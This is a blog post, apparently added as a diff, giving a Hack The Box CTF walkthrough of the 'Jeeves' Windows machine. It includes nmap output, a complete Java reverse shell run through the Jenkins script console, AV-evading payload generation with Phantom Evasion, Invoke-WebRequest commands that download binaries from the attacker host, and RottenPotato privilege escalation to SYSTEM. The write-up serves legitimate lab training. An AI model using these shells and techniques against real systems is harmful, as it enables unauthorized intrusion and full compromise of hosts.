@@ -1,0 +1,202 @@
+---
+layout: post
+title:  "Hack The Box Jeeves writeup (RotenPotato Edition)"
+date:   2020-01-09 18:46:11 -0400
+featured_img: "/assets/jeeves/jeeves.png"
+categories: BoF oscp
+---
+
+
+![Jeeves](/assets/jeeves/jeeves.png)
+
+This machine is interesting to me because of the way we can do privilege escalation here.
+
+As always let's start with nmap.
+
+`nmap -A -p- 10.10.10.63`
+
+{% highlight shell %}
+nmap -A -p- 10.10.10.63
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-08 12:22 EST
+Nmap scan report for 10.10.10.63
+Host is up (0.048s latency).
+Not shown: 65528 filtered ports
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Ask Jeeves
+135/tcp   open  msrpc              Microsoft Windows RPC
+445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2020-01-10T03:49:58+00:00; +1d10h23m27s from scanner time.
+49665/tcp open  msrpc              Microsoft Windows RPC
+49666/tcp open  msrpc              Microsoft Windows RPC
+50000/tcp open  http               Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Error 404 Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2008 (86%)
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2
+Aggressive OS guesses: Microsoft Windows Server 2008 R2 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1d10h23m26s, deviation: 0s, median: 1d10h23m26s
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-01-10T03:49:18
+|_  start_date: 2020-01-10T00:26:08
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT      ADDRESS
+1   53.04 ms 10.10.14.1
+2   53.12 ms 10.10.10.63
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 284.38 seconds
+{% endhighlight %}
+
+
+Let's brute force directories on port 50000
+
+![nmap](/assets/jeeves/nmap.png)
+
+We found /askjeeves, so let's navigate to ` http://10.10.10.63:50000/askjeeves/`
+
+![nmap](/assets/jeeves/dirsearch.png)
+
+This is Jenkins.
+
+![nmap](/assets/jeeves/jenkins.png)
+
+Some googling and we figure out that it is possible to create reverse shell with the following code
+
+{% highlight shell %}
+String host="10.10.14.16";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+{% endhighlight %}
+
+We just need to go to http://10.10.10.63:50000/askjeeves/script paste our code and click run.
+
+![nmap](/assets/jeeves/jenkins2.png)
+
+Start listener:
+
+`nc -nvlp 4444`
+
+And we got a shell
+
+![nmap](/assets/jeeves/shell.png)
+
+We can grab a user.txt now.
+
+But first we need to navigate to kohsuke user folder.
+
+![nmap](/assets/jeeves/user.png)
+
+Ok, I know there are multiple ways to do privilege escalation on this machine. But as you can tell from the title we will do RotenPotato here.
+
+Let's do `systeminfo`
+
+![nmap](/assets/jeeves/systeminfo.png)
+
+Check privileges
+
+`whoami /priv`
+
+![nmap](/assets/jeeves/priv.png)
+
+`SeImpersonatePrivilege` tells us we can probably use Roten Potato here.
+
+For this we need to generate a reverse shell, but since we will probably have AV on the machine we need to encode it. For this we will use Phantom Evasion, whic can be found here `https://github.com/oddcod3/Phantom-Evasion`
+
+Do: `git clone https://github.com/oddcod3/Phantom-Evasion.git` got to Phantom-Evasion folder and run it `python phantom-evasion.py`
+
+Select following options:
+
+1. Windows modules
+
+3. Powershell / Wine-pyinstaller
+
+2. Windows Powershell Script Dropper
+
+enter
+
+1. Msfvenom powershell payload
+
+Put your IP and Port you will be listening on.
+
+Choose name for you shell file
+
+multi processes: n
+strip executable: n
+sign executable: n
+
+![nmap](/assets/jeeves/phantom.png)
+
+Copy created file to our jeeves folder.
+
+Now inside jeeves folder let's start SimpleHTTPServer on port 80
+
+`python -m SimpleHTTPServer 80`
+
+![http](/assets/jeeves/http.png)
+
+Clone repo and copy MSFRotenPotato.exe to our folder and name it rot.exe
+`https://github.com/decoder-it/lonelypotato`
+
+
+
+Upload rotenpotato executable (rot.exe)
+
+`powershell Invoke-WebRequest -o rot.exe http://10.10.14.16/rot.exe`
+
+![nmap](/assets/jeeves/rot.png)
+
+Upload shell
+
+`powershell Invoke-WebRequest -o she.exe http://10.10.14.16/she.exe`
+
+![nmap](/assets/jeeves/she.png)
+
+Start listener on port 443
+
+`nc -nvlp 443`
+
+Run Roten Potato script 
+
+`C:\Users\kohsuke\rot.exe * she.exe`
+
+![nmap](/assets/jeeves/lonelypotato.png)
+
+And we got shell
+
+![nmap](/assets/jeeves/shell2.png)
+
+Let's try accesing Administrator fodler and check root.txt
+
+![nmap](/assets/jeeves/root.png)
+
+Here we do not have root.txt as always but it is hidden inside hm.txt using alternative streams
+
+To view the flag.
+
+`powershell get-content .\hm.txt -stream root.txt`
+
+![nmap](/assets/jeeves/root2.png)
+
